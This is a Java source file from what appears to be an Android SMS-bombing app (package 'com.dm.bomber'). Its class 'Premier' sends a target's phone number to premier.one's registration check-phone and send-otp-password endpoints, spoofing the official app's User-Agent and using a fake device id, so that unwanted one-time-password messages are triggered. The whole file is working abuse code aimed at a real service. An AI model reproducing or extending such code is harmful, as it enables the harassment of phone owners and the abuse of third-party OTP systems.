package com.dm.bomber.services;

import androidx.annotation.NonNull;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.MediaType;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class Premier extends Service {

    @Override
    public void run(Callback callback) {
        try {
            client.newCall(new Request.Builder()
                    .url("https://premier.one/app/v1.1.3/user/register/check-phone")
                    .header("x-device-type", "mobile")
                    .header("x-device-id", "bruh")
                    .header("x-auth-token", "")
                    .header("User-Agent", "premier-one-Android-2.19.0")
                    .post(RequestBody.create(new JSONObject().put("phone", "+" + getFormattedPhone()).toString(), MediaType.parse("application/json")))
                    .build()).enqueue(new okhttp3.Callback() {
                @Override
                public void onFailure(@NonNull Call call, @NonNull IOException e) {
                    callback.onFailure(call, e);
                }

                @Override
                public void onResponse(@NonNull Call call, @NonNull Response response) {
                    try {
                        client.newCall(new Request.Builder()
                                .url("https://premier.one/app/v1.1.3/user/register/send-otp-password")
                                .header("x-device-type", "mobile")
                                .header("x-device-id", "bruh")
                                .header("x-auth-token", "")
                                .header("User-Agent", "premier-one-Android-2.19.0")
                                .post(RequestBody.create(new JSONObject().put("phone", "+" + getFormattedPhone()).toString(), MediaType.parse("application/json")))
                                .build()).enqueue(callback);
                    } catch (JSONException e) {
                        callback.onError(e);
                    }
                }
            });
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
}